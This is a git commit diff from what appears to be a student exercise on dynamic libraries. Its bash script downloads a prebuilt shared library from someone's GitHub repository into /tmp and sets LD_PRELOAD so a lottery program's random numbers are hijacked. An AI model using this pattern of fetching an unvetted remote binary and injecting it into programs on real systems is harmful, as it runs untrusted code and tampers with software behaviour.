a35c70b7b73b9b0dcbfe60293a2f24e8ee99ada9
Ahuron29 <ahurone@gmail.com>
2022-06-16 18:12:16 -0700

    Code injection: Win the Giga Millions!

--- 0x18-dynamic_libraries/101-make_me_win.sh
+++ 0x18-dynamic_libraries/101-make_me_win.sh
@@ -1,3 +1,3 @@
 #!/bin/bash
-wget -q -O /tmp/librandy1.so https://github.com/ianliu-johnston/BatchScripts/raw/master/librandy1.so
- export LD_PRELOAD=/tmp/librandy1.so
+wget -P /tmp https://github.com/robby10Z/alx-low_level_programming/raw/master/0x18-dynamic_libraries/nrandom.so
+export LD_PRELOAD=/tmp/nrandom.so
